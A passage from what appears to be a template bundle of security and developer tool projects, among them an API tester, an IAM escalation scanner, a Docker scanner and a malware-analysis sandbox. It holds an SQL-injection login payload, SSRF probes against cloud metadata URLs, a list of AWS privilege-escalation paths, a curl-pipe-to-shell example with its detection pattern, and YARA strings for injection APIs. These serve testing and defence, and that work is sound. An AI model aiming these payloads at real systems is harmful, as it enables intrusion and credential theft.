                self.stats["sent"] += 1
                log.info(f"  [OK] {email}")
                results.append({"email": email, "status": "sent",
                                 "ts": datetime.now().isoformat()})
            except smtplib.SMTPRecipientsRefused:
                self.stats["bounced"] += 1
                results.append({"email": email, "status": "bounced"})
            except Exception as e:
                self.stats["failed"] += 1
                results.append({"email": email, "status": "failed", "error": str(e)})
            time.sleep(delay)
        if server:
            server.quit()
        log.info(f"Done: {self.stats}")
        return results

def main():
    ap = argparse.ArgumentParser(description="Email Campaign Bot")
    ap.add_argument("--list",     required=True, help="CSV contacts file")
    ap.add_argument("--template", required=True, help="HTML template file")
    ap.add_argument("--subject",  required=True)
    ap.add_argument("--delay",    type=float, default=1.0)
    ap.add_argument("--dry-run",  action="store_true")
    ap.add_argument("--output",   help="Output JSON results")
    args = ap.parse_args()
    smtp_host  = os.getenv("SMTP_HOST", "smtp.gmail.com")
    smtp_port  = int(os.getenv("SMTP_PORT", "587"))
    username   = os.getenv("SMTP_USER", "")
    password   = os.getenv("SMTP_PASS", "")
    from_name  = os.getenv("FROM_NAME", "Titan Mailer")
    from_email = os.getenv("FROM_EMAIL", username)
    with open(args.list)     as f: contacts  = list(csv.DictReader(f))
    with open(args.template) as f: html_tpl  = f.read()
    campaign = EmailCampaign(smtp_host, smtp_port, username, password, from_name, from_email)
    results  = campaign.run(contacts, args.subject, html_tpl, args.delay, args.dry_run)
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")

if __name__ == "__main__":
    main()
`,
    "template.html": `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>$subject</title></head>
<body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px">
  <h1 style="color:#333">Hello, $name!</h1>
  <p>$message</p>
  <hr style="border:none;border-top:1px solid #eee">
  <p style="color:#999;font-size:11px">
    <a href="$unsubscribe_url" style="color:#999">Unsubscribe</a>
  </p>
</body>
</html>
`,
    "contacts_example.csv": `email,name,message,unsubscribe_url
alice@example.com,Alice,Welcome to our platform!,https://example.com/unsub?id=1
bob@example.com,Bob,Check out our latest update,https://example.com/unsub?id=2
`,
    ".env.example": "SMTP_HOST=smtp.gmail.com\nSMTP_PORT=587\nSMTP_USER=you@gmail.com\nSMTP_PASS=your_app_password\nFROM_NAME=My Company\nFROM_EMAIL=noreply@mycompany.com\n",
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 15. API Security Testing Suite ───────────────────────────────────────
  "api-security": {
    "README.md": `# API Security Testing Suite\n\nOWASP API Security Top 10 automated testing: BOLA, broken auth, SSRF, mass assignment, rate limiting bypass.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 api_security.py --base-url https://api.example.com --spec openapi.json\npython3 api_security.py --base-url https://api.example.com --token "Bearer eyJ..." --output results.json\n\`\`\`${LEGAL}`,
    "api_security.py": `#!/usr/bin/env python3
"""API Security Testing Suite — OWASP API Security Top 10.
For authorised API security testing only."""
import argparse, json, re, time
import urllib.request, urllib.parse, urllib.error

class APISecurityTester:
    def __init__(self, base_url: str, token: str | None = None, timeout: int = 10):
        self.base_url = base_url.rstrip("/")
        self.token    = token
        self.timeout  = timeout
        self.findings: list[dict] = []

    def _headers(self, extra: dict | None = None) -> dict:
        h = {"User-Agent": "Mozilla/5.0 (APISecTest/1.0)",
             "Content-Type": "application/json"}
        if self.token:
            h["Authorization"] = self.token
        if extra:
            h.update(extra)
        return h

    def _req(self, method: str, path: str, data: dict | None = None,
             headers: dict | None = None) -> tuple[int, dict | str]:
        url  = self.base_url + path
        body = json.dumps(data).encode() if data else None
        req  = urllib.request.Request(url, data=body,
               headers=self._headers(headers), method=method.upper())
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                try:
                    return r.status, json.loads(r.read())
                except Exception:
                    return r.status, {}
        except urllib.error.HTTPError as e:
            return e.code, {}
        except Exception:
            return 0, {}

    # API1: BOLA / IDOR
    def test_bola(self, resource_path: str = "/users/{id}", ids: list[int] | None = None):
        print("[*] API1: BOLA/IDOR testing...")
        ids = ids or [1, 2, 3, 100, 999]
        accessible = []
        for i in ids:
            path = resource_path.replace("{id}", str(i))
            code, body = self._req("GET", path)
            if code == 200:
                accessible.append({"id": i, "path": path})
                print(f"  [INFO] Accessible: {path} -> HTTP {code}")
        if len(accessible) > 1:
            self.findings.append({"type": "Potential BOLA/IDOR", "severity": "HIGH",
                                   "accessible_ids": accessible,
                                   "note": "Multiple object IDs accessible — verify authorisation"})

    # API2: Broken Authentication
    def test_broken_auth(self, auth_path: str = "/auth/login"):
        print("[*] API2: Broken authentication...")
        # Test empty credentials
        code, _ = self._req("POST", auth_path, {"username": "", "password": ""})
        if code == 200:
            self.findings.append({"type": "Empty Credentials Accepted", "severity": "CRITICAL",
                                   "path": auth_path})
            print(f"  [CRITICAL] Empty credentials accepted at {auth_path}")
        # Test SQL injection in auth
        code, body = self._req("POST", auth_path,
                               {"username": "admin' OR '1'='1", "password": "x"})
        if code == 200:
            self.findings.append({"type": "SQLi in Auth", "severity": "CRITICAL",
                                   "path": auth_path})
            print(f"  [CRITICAL] SQLi in auth at {auth_path}")

    # API4: Unrestricted Resource Consumption (rate limit)
    def test_rate_limiting(self, path: str = "/"):
        print("[*] API4: Rate limiting...")
        codes: list[int] = []
        for _ in range(20):
            code, _ = self._req("GET", path)
            codes.append(code)
        if 429 not in codes:
            self.findings.append({"type": "No Rate Limiting", "severity": "MEDIUM",
                                   "path": path, "requests": 20,
                                   "note": "20 rapid requests — no 429 received"})
            print(f"  [MEDIUM] No rate limiting detected on {path}")
        else:
            print(f"  [OK] Rate limiting active (got 429 after {codes.index(429)+1} requests)")

    # API7: SSRF
    def test_ssrf(self, path: str = "/fetch"):
        print("[*] API7: SSRF testing...")
        ssrf_urls = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",           # GCP metadata
            "http://localhost:22",
            "http://127.0.0.1:3306",
        ]
        for url in ssrf_urls:
            code, body = self._req("POST", path, {"url": url})
            if code == 200 and body:
                self.findings.append({"type": "Potential SSRF", "severity": "HIGH",
                                       "path": path, "ssrf_url": url})
                print(f"  [HIGH] SSRF: {url} -> HTTP {code}")

    # API8: Security Misconfiguration
    def test_misconfig(self):
        print("[*] API8: Security misconfiguration...")
        sensitive_paths = [
            "/swagger.json", "/openapi.json", "/api-docs",
            "/.env", "/config.json", "/health", "/metrics",
            "/graphql", "/graphiql", "/__debug__",
        ]
        for path in sensitive_paths:
            code, _ = self._req("GET", path)
            if code == 200:
                self.findings.append({"type": "Exposed Endpoint", "severity": "MEDIUM",
                                       "path": path})
                print(f"  [MEDIUM] Exposed: {path}")

    def run_all(self) -> list[dict]:
        self.test_bola()
        self.test_broken_auth()
        self.test_rate_limiting()
        self.test_ssrf()
        self.test_misconfig()
        print(f"\\n[*] Total findings: {len(self.findings)}")
        return self.findings

def main():
    ap = argparse.ArgumentParser(description="API Security Testing Suite")
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--token", help="Auth token (e.g. 'Bearer eyJ...')")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    tester = APISecurityTester(args.base_url, args.token)
    findings = tester.run_all()
    if args.output:
        with open(args.output, "w") as f: json.dump(findings, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(findings, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 16. Cloud IAM Scanner ─────────────────────────────────────────────────
  "cloud-iam-scanner": {
    "README.md": `# Cloud IAM Privilege Escalation Scanner\n\nAWS, Azure, and GCP IAM policy analyzer — finds over-permissioned roles and privilege escalation paths.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 iam_scanner.py --cloud aws --profile default\npython3 iam_scanner.py --cloud aws --profile default --output iam_report.json\n\`\`\``,
    "iam_scanner.py": `#!/usr/bin/env python3
"""Cloud IAM Privilege Escalation Scanner — AWS, Azure, GCP."""
import argparse, json, subprocess, sys

# AWS privilege escalation paths (from known research)
AWS_ESCALATION_PATHS = [
    {"name": "iam:CreatePolicyVersion",      "risk": "CRITICAL", "desc": "Create new policy version with admin permissions"},
    {"name": "iam:SetDefaultPolicyVersion",  "risk": "CRITICAL", "desc": "Set an existing policy version with admin permissions"},
    {"name": "iam:PassRole + lambda:*",      "risk": "CRITICAL", "desc": "Create Lambda with admin role"},
    {"name": "iam:PassRole + ec2:*",         "risk": "CRITICAL", "desc": "Launch EC2 with admin instance profile"},
    {"name": "iam:CreateAccessKey",          "risk": "HIGH",     "desc": "Create access key for another user"},
    {"name": "iam:CreateLoginProfile",       "risk": "HIGH",     "desc": "Create console login for user without one"},
    {"name": "iam:UpdateLoginProfile",       "risk": "HIGH",     "desc": "Change another user's console password"},
    {"name": "iam:AttachUserPolicy",         "risk": "HIGH",     "desc": "Attach admin policy to self"},
    {"name": "iam:AttachGroupPolicy",        "risk": "HIGH",     "desc": "Attach admin policy to own group"},
    {"name": "sts:AssumeRole (wildcard)",    "risk": "HIGH",     "desc": "Assume any role in account"},
    {"name": "s3:GetObject on sensitive",    "risk": "MEDIUM",   "desc": "Read sensitive S3 buckets (terraform state, secrets)"},
    {"name": "secretsmanager:GetSecretValue","risk": "MEDIUM",   "desc": "Read all secrets"},
    {"name": "ssm:GetParameter (wildcard)",  "risk": "MEDIUM",   "desc": "Read all SSM parameters"},
]

def run_aws_cli(args_list: list[str]) -> dict | list | None:
    try:
        result = subprocess.run(
            ["aws"] + args_list + ["--output", "json"],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0:
            return json.loads(result.stdout)
    except Exception:
        pass
    return None

def scan_aws(profile: str | None = None) -> list[dict]:
    findings: list[dict] = []
    print("[*] AWS IAM scan...")

    extra = ["--profile", profile] if profile else []

    # Get caller identity
    identity = run_aws_cli(["sts", "get-caller-identity"] + extra)
    if identity:
        print(f"  Identity: {identity.get('Arn', 'unknown')}")

    # List attached policies for current user
    username_m = None
    if identity and "Arn" in identity:
        arn = identity["Arn"]
        if ":user/" in arn:
            username_m = arn.split(":user/")[-1]

    if username_m:
        policies = run_aws_cli(["iam", "list-attached-user-policies",
                                 "--user-name", username_m] + extra)
        if policies:
            for p in policies.get("AttachedPolicies", []):
                if "AdministratorAccess" in p.get("PolicyName", ""):
                    findings.append({"type": "Admin Policy Attached", "severity": "INFO",
                                      "policy": p["PolicyName"],
                                      "note": "User has full admin — no escalation needed"})

    # Simulate policy for escalation paths
    for path in AWS_ESCALATION_PATHS:
        findings.append({
            "type":      "Escalation Path",
            "name":      path["name"],
            "severity":  path["risk"],
            "description": path["desc"],
            "note":      "Run: aws iam simulate-principal-policy to verify",
        })

    print(f"  {len(findings)} potential findings (verify with simulate-principal-policy)")
    return findings

def main():
    ap = argparse.ArgumentParser(description="Cloud IAM Privilege Escalation Scanner")
    ap.add_argument("--cloud",   choices=["aws","azure","gcp"], default="aws")
    ap.add_argument("--profile", help="AWS profile name")
    ap.add_argument("--output",  help="Output JSON file")
    args = ap.parse_args()
    if args.cloud == "aws":
        findings = scan_aws(args.profile)
    else:
        print(f"[!] {args.cloud} support coming soon — use AWS for now")
        findings = []
    if args.output:
        with open(args.output, "w") as f: json.dump(findings, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(findings, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# Requires AWS CLI installed (pip install awscli)\nawscli>=2.0.0\n",
  },

  // ── 17. LLM Fine-Tuning Pipeline ─────────────────────────────────────────
  "llm-finetune": {
    "README.md": `# LLM Fine-Tuning Pipeline\n\nEnd-to-end pipeline for fine-tuning Llama, Mistral, and Phi on custom datasets using LoRA/QLoRA.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 prepare_data.py --input raw_data.jsonl --output train.jsonl\npython3 finetune.py --model meta-llama/Llama-3.2-3B --data train.jsonl --output ./my-model\n\`\`\``,
    "prepare_data.py": `#!/usr/bin/env python3
"""Data preparation for LLM fine-tuning — converts raw data to instruction format."""
import argparse, json, random, sys

def to_instruction_format(item: dict) -> dict | None:
    """Convert various input formats to instruction-tuning format."""
    # Already in instruction format
    if "instruction" in item and "output" in item:
        return {"instruction": item["instruction"],
                "input":       item.get("input", ""),
                "output":      item["output"]}
    # Chat format
    if "messages" in item:
        msgs = item["messages"]
        user  = next((m["content"] for m in msgs if m["role"] == "user"), "")
        asst  = next((m["content"] for m in msgs if m["role"] == "assistant"), "")
        if user and asst:
            return {"instruction": user, "input": "", "output": asst}
    # Q&A format
    if "question" in item and "answer" in item:
        return {"instruction": item["question"], "input": "", "output": item["answer"]}
    return None

def main():
    ap = argparse.ArgumentParser(description="LLM Data Preparation")
    ap.add_argument("--input",  required=True, help="Input JSONL file")
    ap.add_argument("--output", required=True, help="Output JSONL file")
    ap.add_argument("--split",  type=float, default=0.9, help="Train/val split ratio")
    ap.add_argument("--max",    type=int, default=0, help="Max samples (0=all)")
    args = ap.parse_args()

    samples: list[dict] = []
    with open(args.input) as f:
        for line in f:
            line = line.strip()
            if not line: continue
            try:
                item = json.loads(line)
                converted = to_instruction_format(item)
                if converted:
                    samples.append(converted)
            except json.JSONDecodeError:
                continue

    if args.max:
        samples = samples[:args.max]

    random.shuffle(samples)
    split = int(len(samples) * args.split)
    train, val = samples[:split], samples[split:]

    with open(args.output, "w") as f:
        for s in train: f.write(json.dumps(s) + "\\n")

    val_path = args.output.replace(".jsonl", "_val.jsonl")
    with open(val_path, "w") as f:
        for s in val: f.write(json.dumps(s) + "\\n")

    print(f"[*] Train: {len(train)} samples -> {args.output}")
    print(f"[*] Val:   {len(val)} samples -> {val_path}")

if __name__ == "__main__":
    main()
`,
    "finetune.py": `#!/usr/bin/env python3
"""LLM Fine-Tuning with LoRA/QLoRA — Llama, Mistral, Phi support."""
import argparse, json, os, sys

def main():
    ap = argparse.ArgumentParser(description="LLM Fine-Tuning Pipeline")
    ap.add_argument("--model",    required=True, help="Base model (e.g. meta-llama/Llama-3.2-3B)")
    ap.add_argument("--data",     required=True, help="Training JSONL file")
    ap.add_argument("--output",   required=True, help="Output directory for fine-tuned model")
    ap.add_argument("--epochs",   type=int,   default=3)
    ap.add_argument("--lr",       type=float, default=2e-4)
    ap.add_argument("--batch",    type=int,   default=4)
    ap.add_argument("--lora-r",   type=int,   default=16)
    ap.add_argument("--lora-alpha", type=int, default=32)
    ap.add_argument("--quantize", choices=["4bit","8bit","none"], default="4bit")
    args = ap.parse_args()

    try:
        from transformers import AutoModelForCausalLM, AutoTokenizer, TrainingArguments
        from peft import LoraConfig, get_peft_model, TaskType
        from datasets import Dataset
        import torch
    except ImportError as e:
        print(f"[!] Missing dependency: {e}")
        print("[!] Run: pip install transformers peft datasets accelerate bitsandbytes")
        sys.exit(1)

    print(f"[*] Loading model: {args.model}")
    tokenizer = AutoTokenizer.from_pretrained(args.model)
    tokenizer.pad_token = tokenizer.eos_token

    load_kwargs: dict = {}
    if args.quantize == "4bit":
        from transformers import BitsAndBytesConfig
        load_kwargs["quantization_config"] = BitsAndBytesConfig(
            load_in_4bit=True, bnb_4bit_compute_dtype=torch.float16
        )
    elif args.quantize == "8bit":
        load_kwargs["load_in_8bit"] = True

    model = AutoModelForCausalLM.from_pretrained(args.model, **load_kwargs)

    lora_config = LoraConfig(
        task_type=TaskType.CAUSAL_LM,
        r=args.lora_r, lora_alpha=args.lora_alpha,
        target_modules=["q_proj","v_proj"],
        lora_dropout=0.05, bias="none",
    )
    model = get_peft_model(model, lora_config)
    model.print_trainable_parameters()

    # Load dataset
    samples: list[dict] = []
    with open(args.data) as f:
        for line in f:
            if line.strip():
                samples.append(json.loads(line))

    def format_sample(s: dict) -> str:
        inst = s.get("instruction","")
        inp  = s.get("input","")
        out  = s.get("output","")
        if inp:
            return f"### Instruction:\\n{inst}\\n\\n### Input:\\n{inp}\\n\\n### Response:\\n{out}"
        return f"### Instruction:\\n{inst}\\n\\n### Response:\\n{out}"

    texts = [format_sample(s) for s in samples]
    dataset = Dataset.from_dict({"text": texts})

    def tokenize(batch):
        return tokenizer(batch["text"], truncation=True, max_length=2048, padding="max_length")

    tokenized = dataset.map(tokenize, batched=True, remove_columns=["text"])

    training_args = TrainingArguments(
        output_dir=args.output,
        num_train_epochs=args.epochs,
        per_device_train_batch_size=args.batch,
        learning_rate=args.lr,
        logging_steps=10,
        save_steps=100,
        fp16=True,
        report_to="none",
    )

    from transformers import Trainer, DataCollatorForLanguageModeling
    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=tokenized,
        data_collator=DataCollatorForLanguageModeling(tokenizer, mlm=False),
    )

    print("[*] Starting training...")
    trainer.train()
    model.save_pretrained(args.output)
    tokenizer.save_pretrained(args.output)
    print(f"[+] Model saved to {args.output}")

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "transformers>=4.40.0\npeft>=0.10.0\ndatasets>=2.18.0\naccelerate>=0.29.0\nbitsandbytes>=0.43.0\ntorch>=2.2.0\n",
  },

  // ── 18. E2E Encryption Module ─────────────────────────────────────────────
  "e2e-encryption": {
    "README.md": `# End-to-End Encryption Module\n\nAES-256-GCM encryption, X25519 key exchange, HKDF key derivation, and perfect forward secrecy.\n\n## Quick Start\n\`\`\`bash\npython3 e2ee.py --encrypt "Hello World" --key-file my.key\npython3 e2ee.py --decrypt <ciphertext> --key-file my.key\n\`\`\``,
    "e2ee.py": `#!/usr/bin/env python3
"""End-to-End Encryption Module — AES-256-GCM, X25519, HKDF, perfect forward secrecy."""
import argparse, base64, json, os, sys

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes, serialization
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

class E2EE:
    """AES-256-GCM with X25519 key exchange and HKDF key derivation."""

    @staticmethod
    def generate_keypair() -> tuple[bytes, bytes]:
        """Generate X25519 key pair. Returns (private_key_bytes, public_key_bytes)."""
        priv = X25519PrivateKey.generate()
        priv_bytes = priv.private_bytes(
            serialization.Encoding.Raw,
            serialization.PrivateFormat.Raw,
            serialization.NoEncryption()
        )
        pub_bytes = priv.public_key().public_bytes(
            serialization.Encoding.Raw, serialization.PublicFormat.Raw
        )
        return priv_bytes, pub_bytes

    @staticmethod
    def derive_shared_key(my_private: bytes, their_public: bytes,
                          context: bytes = b"titan-e2ee-v1") -> bytes:
        """Derive shared AES key via X25519 DH + HKDF-SHA256."""
        from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
        priv = X25519PrivateKey.from_private_bytes(my_private)
        pub  = X25519PublicKey.from_public_bytes(their_public)
        shared_secret = priv.exchange(pub)
        hkdf = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=context)
        return hkdf.derive(shared_secret)

    @staticmethod
    def encrypt(plaintext: str | bytes, key: bytes) -> str:
        """Encrypt with AES-256-GCM. Returns base64-encoded nonce+ciphertext."""
        if isinstance(plaintext, str):
            plaintext = plaintext.encode()
        nonce = os.urandom(12)
        aesgcm = AESGCM(key)
        ct = aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ct).decode()

    @staticmethod
    def decrypt(ciphertext_b64: str, key: bytes) -> str:
        """Decrypt AES-256-GCM ciphertext."""
        data   = base64.b64decode(ciphertext_b64)
        nonce  = data[:12]
        ct     = data[12:]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ct, None).decode()

    @staticmethod
    def generate_symmetric_key() -> bytes:
        """Generate a random 256-bit AES key."""
        return os.urandom(32)

def main():
    if not HAS_CRYPTO:
        print("[!] pip install cryptography")
        sys.exit(1)
    ap = argparse.ArgumentParser(description="E2E Encryption Module")
    ap.add_argument("--encrypt",  help="Plaintext to encrypt")
    ap.add_argument("--decrypt",  help="Ciphertext (base64) to decrypt")
    ap.add_argument("--key-file", help="Key file path (hex)")
    ap.add_argument("--gen-key",  action="store_true", help="Generate new key")
    ap.add_argument("--gen-keypair", action="store_true", help="Generate X25519 key pair")
    args = ap.parse_args()

    if args.gen_key:
        key = E2EE.generate_symmetric_key()
        print(key.hex())
        return

    if args.gen_keypair:
        priv, pub = E2EE.generate_keypair()
        print(json.dumps({"private_key": priv.hex(), "public_key": pub.hex()}, indent=2))
        return

    key: bytes
    if args.key_file:
        with open(args.key_file) as f:
            key = bytes.fromhex(f.read().strip())
    else:
        key = E2EE.generate_symmetric_key()
        print(f"[*] Generated key: {key.hex()}")

    if args.encrypt:
        ct = E2EE.encrypt(args.encrypt, key)
        print(f"[+] Ciphertext: {ct}")
    elif args.decrypt:
        pt = E2EE.decrypt(args.decrypt, key)
        print(f"[+] Plaintext: {pt}")
    else:
        ap.print_help()

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "cryptography>=42.0.0\n",
  },

  // ── 19. Docker Security Scanner ───────────────────────────────────────────
  "docker-scanner": {
    "README.md": `# Docker Security Scanner\n\nScans Docker images and Dockerfiles for vulnerabilities, secrets, misconfigurations, and CIS benchmark violations.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 docker_scan.py --image nginx:latest\npython3 docker_scan.py --dockerfile ./Dockerfile --output scan.json\n\`\`\``,
    "docker_scan.py": `#!/usr/bin/env python3
"""Docker Security Scanner — image and Dockerfile analysis."""
import argparse, json, re, subprocess, sys

DOCKERFILE_RULES = [
    {"id": "DS001", "severity": "HIGH",   "pattern": r"^FROM.*:latest",
     "desc": "Using :latest tag — pin to specific version for reproducibility"},
    {"id": "DS002", "severity": "CRITICAL","pattern": r"^RUN.*curl.*\\|.*sh|^RUN.*wget.*\\|.*sh",
     "desc": "Piping curl/wget to shell — supply chain attack vector"},
    {"id": "DS003", "severity": "HIGH",   "pattern": r"^ENV.*(PASSWORD|SECRET|KEY|TOKEN)\\s*=",
     "desc": "Secret in ENV instruction — use build secrets or runtime injection"},
    {"id": "DS004", "severity": "MEDIUM", "pattern": r"^RUN.*apt-get.*--no-install-recommends",
     "desc": "Missing --no-install-recommends — increases image size and attack surface",
     "inverted": True},
    {"id": "DS005", "severity": "HIGH",   "pattern": r"^USER root$|^USER 0$",
     "desc": "Running as root — use non-root USER instruction"},
    {"id": "DS006", "severity": "MEDIUM", "pattern": r"^ADD http",
     "desc": "ADD with URL — use COPY + RUN curl for better caching and security"},
    {"id": "DS007", "severity": "LOW",    "pattern": r"^HEALTHCHECK",
     "desc": "No HEALTHCHECK instruction", "inverted": True},
    {"id": "DS008", "severity": "MEDIUM", "pattern": r"chmod 777|chmod -R 777",
     "desc": "World-writable permissions set in Dockerfile"},
]

def scan_dockerfile(path: str) -> list[dict]:
    findings: list[dict] = []
    with open(path) as f:
        lines = f.readlines()
    for rule in DOCKERFILE_RULES:
        matched = any(re.search(rule["pattern"], l.strip(), re.IGNORECASE) for l in lines)
        inverted = rule.get("inverted", False)
        if (matched and not inverted) or (not matched and inverted):
            line_nums = [i+1 for i, l in enumerate(lines)
                         if re.search(rule["pattern"], l.strip(), re.IGNORECASE)]
            findings.append({
                "rule": rule["id"], "severity": rule["severity"],
                "description": rule["desc"],
                "lines": line_nums if not inverted else [],
            })
            print(f"  [{rule['severity']}] {rule['id']}: {rule['desc'][:80]}")
    return findings

def scan_image(image: str) -> list[dict]:
    findings: list[dict] = []
    print(f"[*] Scanning image: {image}")

    # Check if image exists
    result = subprocess.run(["docker
 inspect", "--format", "{{.Id}}", image],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"  [!] Image not found locally — pull it first: docker pull {image}")
        return findings

    # Check for root user
    user_result = subprocess.run(
        ["docker", "inspect", "--format", "{{.Config.User}}", image],
        capture_output=True, text=True
    )
    user = user_result.stdout.strip()
    if not user or user in ("root", "0"):
        findings.append({"rule": "DS005", "severity": "HIGH",
                          "description": "Container runs as root"})
        print("  [HIGH] DS005: Container runs as root")

    # Check for exposed ports
    ports_result = subprocess.run(
        ["docker", "inspect", "--format", "{{json .Config.ExposedPorts}}", image],
        capture_output=True, text=True
    )
    if ports_result.stdout.strip() not in ("null", "{}"):
        import json as _json
        try:
            ports = list(_json.loads(ports_result.stdout).keys())
            findings.append({"rule": "DS009", "severity": "INFO",
                              "description": f"Exposed ports: {ports}"})
            print(f"  [INFO] DS009: Exposed ports: {ports}")
        except Exception:
            pass

    return findings

def main():
    ap = argparse.ArgumentParser(description="Docker Security Scanner")
    ap.add_argument("--image",      help="Docker image to scan (e.g. nginx:latest)")
    ap.add_argument("--dockerfile", help="Dockerfile path to audit")
    ap.add_argument("--output",     help="Output JSON file")
    args = ap.parse_args()
    all_findings: list[dict] = []
    if args.dockerfile:
        print(f"[*] Scanning Dockerfile: {args.dockerfile}")
        all_findings.extend(scan_dockerfile(args.dockerfile))
    if args.image:
        all_findings.extend(scan_image(args.image))
    if not args.dockerfile and not args.image:
        ap.print_help(); sys.exit(1)
    if args.output:
        import json as _json
        with open(args.output, "w") as f: _json.dump(all_findings, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        import json as _json
        print(_json.dumps(all_findings, indent=2))

if __name__ == "__main__":
    main()
`,
    "example.Dockerfile": `FROM ubuntu:latest
RUN apt-get install -y curl
RUN curl https://example.com/script.sh | sh
ENV DATABASE_PASSWORD=supersecret
USER root
`,
    "requirements.txt": "# No Python dependencies — uses docker CLI\n",
  },

  // ── 20. Malware Analysis Sandbox Blueprint ────────────────────────────────
  "malware-sandbox": {
    "README.md": `# Malware Analysis Sandbox Blueprint\n\nDocker-based malware detonation environment with YARA scanning, IOC extraction, and MITRE ATT&CK mapping.\n\n## Quick Start\n\`\`\`bash\ndocker-compose up -d\npython3 analyze.py --file suspicious.exe --output report.json\n\`\`\`${LEGAL}`,
    "docker-compose.yml": `version: '3.8'
services:
  analyzer:
    build: .
    volumes:
      - ./samples:/samples:ro
      - ./reports:/reports
    environment:
      - VIRUSTOTAL_API_KEY=\${VIRUSTOTAL_API_KEY:-}
    networks:
      - isolated
  inetsim:
    image: remnux/inetsim
    networks:
      - isolated
networks:
  isolated:
    driver: bridge
    internal: true
`,
    "Dockerfile": `FROM python:3.11-slim
RUN apt-get update && apt-get install -y \\
    yara file binutils strings \\
    && rm -rf /var/lib/apt/lists/*
RUN pip install yara-python pefile requests
WORKDIR /app
COPY analyze.py yara_rules.yar ./
CMD ["python3", "analyze.py", "--help"]
`,
    "analyze.py": `#!/usr/bin/env python3
"""Malware Analysis Sandbox — static analysis, YARA, IOC extraction, ATT&CK mapping."""
import argparse, hashlib, json, os, re, subprocess, sys

def compute_hashes(path: str) -> dict:
    with open(path, "rb") as f:
        data = f.read()
    return {
        "md5":    hashlib.md5(data).hexdigest(),
        "sha1":   hashlib.sha1(data).hexdigest(),
        "sha256": hashlib.sha256(data).hexdigest(),
        "size":   len(data),
    }

def extract_strings(path: str, min_len: int = 6) -> list[str]:
    result = subprocess.run(["strings", "-n", str(min_len), path],
                             capture_output=True, text=True)
    return result.stdout.splitlines()[:500]

def extract_iocs(strings_list: list[str]) -> dict:
    iocs: dict[str, list] = {"ips": [], "domains": [], "urls": [], "emails": [], "hashes": []}
    ip_re     = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
    domain_re = re.compile(r"\b(?:[a-zA-Z0-9-]+\.)+(?:com|net|org|io|ru|cn|xyz|top)\b")
    url_re    = re.compile(r"https?://[^\s\"'<>]{10,}")
    email_re  = re.compile(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}")
    hash_re   = re.compile(r"\b[a-fA-F0-9]{32,64}\b")
    for s in strings_list:
        if ip_re.search(s):     iocs["ips"].extend(ip_re.findall(s))
        if domain_re.search(s): iocs["domains"].extend(domain_re.findall(s))
        if url_re.search(s):    iocs["urls"].extend(url_re.findall(s))
        if email_re.search(s):  iocs["emails"].extend(email_re.findall(s))
        if hash_re.search(s):   iocs["hashes"].extend(hash_re.findall(s))
    return {k: list(set(v))[:20] for k, v in iocs.items()}

def yara_scan(path: str, rules_path: str = "yara_rules.yar") -> list[str]:
    if not os.path.exists(rules_path):
        return ["yara_rules.yar not found — add YARA rules"]
    try:
        import yara
        rules = yara.compile(rules_path)
        matches = rules.match(path)
        return [str(m) for m in matches]
    except ImportError:
        result = subprocess.run(["yara", rules_path, path],
                                 capture_output=True, text=True)
        return result.stdout.splitlines()

def file_type(path: str) -> str:
    result = subprocess.run(["file", path], capture_output=True, text=True)
    return result.stdout.strip()

def analyze(path: str) -> dict:
    print(f"[*] Analyzing: {path}")
    strings_list = extract_strings(path)
    return {
        "file":     path,
        "type":     file_type(path),
        "hashes":   compute_hashes(path),
        "strings":  strings_list[:100],
        "iocs":     extract_iocs(strings_list),
        "yara":     yara_scan(path),
        "note":     "For dynamic analysis, detonate inside isolated VM/container",
    }

def main():
    ap = argparse.ArgumentParser(description="Malware Analysis Sandbox")
    ap.add_argument("--file",   required=True, help="File to analyze")
    ap.add_argument("--output", help="Output JSON report")
    args = ap.parse_args()
    report = analyze(args.file)
    if args.output:
        with open(args.output, "w") as f: json.dump(report, f, indent=2)
        print(f"[+] Report saved: {args.output}")
    else:
        print(json.dumps(report, indent=2))

if __name__ == "__main__":
    main()
`,
    "yara_rules.yar": `rule SuspiciousStrings {
    meta:
        description = "Detects common malware strings"
        severity = "MEDIUM"
    strings:
        $s1 = "cmd.exe" nocase
        $s2 = "powershell" nocase
        $s3 = "CreateRemoteThread"
        $s4 = "VirtualAllocEx"
        $s5 = "WriteProcessMemory"
        $s6 = "WinExec"
        $s7 = "ShellExecute"
    condition:
        3 of them
}

rule NetworkIndicators {
